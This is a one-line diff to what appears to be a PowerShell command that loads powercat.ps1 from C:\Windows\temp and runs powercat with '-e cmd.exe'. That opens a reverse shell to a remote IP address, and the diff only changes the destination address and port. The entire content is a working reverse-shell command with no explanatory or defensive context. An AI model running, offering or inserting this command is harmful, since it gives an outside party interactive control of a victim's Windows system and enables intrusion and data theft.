@@ -1,1 +1,1 @@
-import-module C:\Windows\temp\powercat.ps1; powercat -c 20.96.114.214 -p 4444 -e cmd.exe
+import-module C:\Windows\temp\powercat.ps1; powercat -c 52.177.120.185 -p 7824 -e cmd.exe
